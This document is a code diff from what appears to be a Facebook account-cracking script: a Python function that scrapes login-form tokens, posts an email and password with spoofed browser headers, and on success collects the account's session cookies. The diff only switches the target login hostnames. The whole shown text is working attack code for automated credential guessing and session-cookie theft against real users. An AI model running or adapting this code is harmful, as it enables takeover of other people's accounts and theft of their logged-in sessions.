@@ -1159,13 +1159,13 @@ def m4(idf,pwv):
    free_fb = session.get(f'https://m.facebook.com/?locale2=en_GB').text
    log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
    header_freefb ={
-    'authority': 'p.facebook.com',
+    'authority': 'm.facebook.com',
     'accept': '*/*',
     'accept-language': 'es-MX,es;q=0.9',
     'content-type': 'application/x-www-form-urlencoded',
     'dpr': '2.75',
-    'origin': 'https://p.facebook.com',
-    'referer': 'https://p.facebook.com/?locale2=en_GB',
+    'origin': 'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/?locale2=en_GB',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
     'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
@@ -1182,7 +1182,7 @@ def m4(idf,pwv):
     'x-fb-lsd': 'AVq9MsDYu_k',
     'x-requested-with': 'XMLHttpRequest',
     'x-response-format': 'JSONStream'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=log_data,headers=header_freefb).text
+   lo = session.post('https://login.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
